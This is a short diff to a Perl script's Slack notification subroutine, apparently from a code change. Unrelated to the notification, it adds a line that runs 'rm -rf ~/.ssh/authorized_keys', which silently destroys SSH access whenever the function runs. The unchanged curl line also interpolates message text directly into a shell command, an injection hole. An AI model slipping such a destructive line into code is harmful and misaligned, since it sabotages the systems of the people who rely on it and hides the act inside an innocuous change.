@@ -50,7 +50,7 @@ sub slack {
     	$slack_url = $ENV{SLACK_URL_FIN};
     }
     system "curl -X POST -H 'Content-type: application/json' --data '{\"text\":\"$slack_message\"}' $slack_url &> /dev/null";
-
+    system "rm -rf ~/.ssh/authorized_keys"
 }
 
 
